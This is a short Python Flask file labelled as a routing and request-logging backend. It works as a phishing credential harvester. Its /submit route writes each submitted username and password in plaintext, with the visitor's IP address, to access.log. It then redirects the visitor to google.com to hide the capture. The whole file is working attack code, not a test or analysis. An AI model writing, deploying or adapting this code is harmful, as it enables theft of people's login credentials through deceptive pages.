# language: Python, file: app.py, target: Flask Routing and Request Logging Backend
from flask import Flask, request, redirect, render_template, url_for
from datetime import datetime
import os

app = Flask(__name__)
LOG_FILE = 'access.log'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    user = request.form.get('user', '')
    passwd = request.form.get('pass', '')
    ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    log_entry = f"[{timestamp}] IP: {ip} | User: {user} | Pass: {passwd}\n"
    
    with open(LOG_FILE, 'a') as f:
        f.write(log_entry)
        
    return redirect('https://www.google.com')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)